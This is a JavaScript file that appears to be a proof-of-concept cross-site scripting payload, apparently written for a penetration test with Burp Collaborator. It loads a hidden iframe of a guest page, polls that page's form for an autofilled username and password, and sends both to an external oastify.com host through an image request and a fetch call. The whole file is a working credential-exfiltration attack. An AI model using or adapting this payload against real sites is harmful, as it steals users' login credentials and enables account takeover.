// life1.js - Poll until password is populated
(function() {
    function init() {
        alert('Step 1: Creating iframe...');
        
        var iframe = document.createElement('iframe');
        iframe.src = '/web/guest/add';
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        
        iframe.onload = function() {
            alert('Step 2: Iframe loaded, waiting for the password...');
            
            var attempts = 0;
            var maxAttempts = 20; // Try for 20 seconds
            
            // Poll every second until password is found
            var checker = setInterval(function() {
                attempts++;
                
                try {
                    var pwdInput = iframe.contentDocument.querySelector('input[name="fake_password"]');
                    var userInput = iframe.contentDocument.querySelector('input[name="fake_username"]');
                    
                    var password = pwdInput ? pwdInput.value : '';
                    var username = userInput ? userInput.value : '';
                    
                    console.log('Attempt ' + attempts + ': pwd=' + password + ', user=' + username);
                    
                    // Check if we got values
                    if (password && password.length > 0) {
                        clearInterval(checker);
                        
                        alert('✅ Password found: ' + password);
                        
                        // Send to Burp Collaborator
                        var collab = 'https://m9wvitwtgk19gvfaojwmvuxw7nde15pu.oastify.com';
                        
                        // Use Image to avoid CORS issues
                        var img = new Image();
                        img.src = collab + '/?user=' + encodeURIComponent(username) + '&pwd=' + encodeURIComponent(password);
                        document.body.appendChild(img);
                        
                        // Also try fetch
                        fetch(collab + '/?user=' + encodeURIComponent(username) + '&pwd=' + encodeURIComponent(password))
                            .catch(function(e) {
                                console.log('Fetch failed (expected due to CORS), but image request sent');
                            });
                        
                        alert('✅ Password sent to Burp Collaborator!');
                        
                    } else if (attempts >= maxAttempts) {
                        clearInterval(checker);
                        alert('❌ Timeout: Password never populated after ' + maxAttempts + ' seconds');
                    }
                    
                } catch(e) {
                    clearInterval(checker);
                    alert('❌ Error: ' + e.message);
                }
            }, 1000); // Check every 1 second
        };
    }
    
    // Wait for DOM
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
